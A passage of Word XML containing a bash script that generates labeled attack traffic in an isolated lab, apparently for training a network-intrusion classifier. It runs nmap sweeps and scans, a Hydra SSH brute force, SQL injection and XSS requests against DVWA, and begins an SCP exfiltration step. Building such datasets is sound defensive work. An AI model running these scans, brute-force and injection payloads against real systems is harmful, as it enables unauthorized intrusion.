          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>This file is harmless and used only for controlled ML traffic labeling.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Project: AI Network Manager</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>EOF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    fi</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if [ ! -f "$LABEL_LOG" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        echo "timestamp,class,activity,target,notes" &gt; "$LABEL_LOG"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    fi</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log_label() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    local class="$1"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    local activity="$2"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    local target="$3"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    local notes="$4"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "$(now_iso),$class,$activity,$target,$notes" &gt;&gt; "$LABEL_LOG"</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is_private_ip() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    local ip="$1"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    [[ "$ip" =~ ^10\. ]] &amp;&amp; return 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    [[ "$ip" =~ ^192\.168\. ]] &amp;&amp; return 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] &amp;&amp; return 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 1</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safety_check() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "SAFETY CHECK"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] Checking target IPs..."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for ip in "$META_IP" "$UBUNTU_IP" "$WINDOWS_IP" "$AI_MANAGER_IP"; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        if ! is_private_ip "$ip"; then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            echo "[!] Safety check failed: $ip is not a private RFC1918 lab IP."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            echo "[!] Edit the script and use only your isolated VCloud lab IPs."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            exit 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        fi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    done</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Safety check passed. All configured hosts are private lab IPs."</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check_tools() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "TOOL CHECK"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    local missing=0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    for tool in nmap hydra curl dig nslookup ssh sshpass scp smbclient hping3; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        if ! command -v "$tool" &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            echo "[!] Missing tool: $tool"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            missing=1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            echo "[+] Found: $tool"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        fi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    done</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if [ "$missing" -eq 1 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        echo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        echo "Install missing tools with:"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        echo "sudo apt update"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        echo "sudo apt install -y nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        exit 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    fi</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3. NORMAL TRAFFIC</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normal_traffic() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "CLASS: NORMAL TRAFFIC"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    log_label "Normal" "Start normal traffic generation" "Multiple" "DNS HTTP and SSH baseline"</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Running DNS lookups..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    dig example.com &gt; "$LOG_DIR/normal_dns_dig_$(timestamp).log" 2&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    nslookup example.com &gt; "$LOG_DIR/normal_dns_nslookup_$(timestamp).log"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Simulating normal web browsing to lab services..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    curl -I --max-time 5 "http://$META_IP" &gt; "$LOG_DIR/normal_http_meta_$(timestamp).log" 2&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    curl -I --max-time 5 "http://$UBUNTU_IP" &gt; "$LOG_DIR/normal_http_ubuntu_$(timestamp).log"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Simulating a normal SSH login to Metasploitable..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        "$META_USER@$META_IP" "whoami; hostname" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        &gt; "$LOG_DIR/normal_ssh_meta_$(timestamp).log"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"Normal" "Completed normal traffic generation" "Multiple" "Baseline completed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[+] Normal traffic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4. RECONNAISSANCE</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recon_scan() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "CLASS: RECONNAISSANCE"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    log_label "Recon" "Start ping sweep" "$TARGET_SUBNET" "Nmap host discovery"</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Running ping sweep against lab subnet..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    nmap -sn "$TARGET_SUBNET" -oN "$LOG_DIR/recon_ping_sweep_$(timestamp).log"</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"Recon" "Start TCP SYN scan" "$META_IP" "Nmap SYN scan"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] Running TCP SYN scan against Metasploitable..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    sudo nmap -sS "$META_IP" -oN "$LOG_DIR/recon_syn_scan_meta_$(timestamp).log"</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"Recon" "Start service version enumeration" "$META_IP" "Nmap service discovery"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] Running service/version enumeration against Metasploitable..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    nmap -sV "$META_IP" -oN "$LOG_DIR/recon_service_enum_meta_$(timestamp).log"</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"Recon" "Completed reconnaissance" "$META_IP" "Recon completed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[+] Reconnaissance traffic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5. BRUTE FORCE</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ssh_bruteforce() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "CLASS: BRUTE FORCE"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    log_label "Brute Force" "Start controlled SSH brute force" "$META_IP" "Hydra small wordlist"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Running controlled SSH brute-force attempt against Metasploitable..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] This uses a small lab wordlist to create authentication-failure traffic."</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hydra -l "$META_USER" -P "$WORDLIST" "ssh://$META_IP" -t 2 -W 5 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        -o "$LOG_DIR/bruteforce_ssh_meta_$(timestamp).log"</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"Brute Force" "Completed controlled SSH brute force" "$META_IP" "Hydra completed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[+] SSH brute-force simulation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6. WEB ATTACKS</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web_attack() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "CLASS: WEB ATTACK"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    log_label "Web Attack" "Start web attack payloads" "$META_IP" "SQLi and XSS test requests"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Sending a normal web request first..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    curl --max-time 5 "http://$META_IP/" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        -o "$LOG_DIR/web_normal_request_$(timestamp).html" 2&gt;/dev/null</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Sending SQL injection-style test payload to DVWA path if available..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&amp;Submit=Submit" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        -o "$LOG_DIR/web_sqli_payload_$(timestamp).html" 2&gt;/dev/null</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Sending XSS-style test payload to DVWA path if available..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        -o "$LOG_DIR/web_xss_payload_$(timestamp).html" 2&gt;/dev/null</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"Web Attack" "Completed web payload requests" "$META_IP" "Web attack simulation completed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[+] Web attack simulation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7. EXFILTRATION SIMULATION</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exfiltration_simulation() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "CLASS: EXFILTRATION"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    log_label "Exfiltration" "Start SCP transfer simulation" "$META_IP" "Harmless sample file transfer"</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Simulating file movement using SCP."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
